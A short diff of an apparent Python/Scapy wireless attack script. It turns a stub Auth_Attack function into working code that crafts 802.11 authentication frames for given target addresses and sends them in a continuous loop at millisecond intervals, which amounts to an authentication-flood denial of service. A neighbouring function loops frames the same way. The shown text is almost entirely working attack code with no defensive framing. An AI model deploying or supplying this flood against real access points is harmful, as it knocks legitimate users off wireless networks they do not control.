@@ -17,8 +17,9 @@ def Ap_Unicast(argu):
     sendp(frame, iface=argu[0], inter=0.001, loop=1)
 
 def Auth_Attack(argu):
-    print(argu)
-    return 0
+    dot11 = Dot11(type=0, subtype=11, addr1=argu[1],addr2=argu[2], addr3=argu[1])
+    frame = RadioTap()/dot11/Dot11Auth(seqnum=1)
+    sendp(frame, iface=argu[0], inter=0.001, loop=1)
 
 
 def Hopping(args):
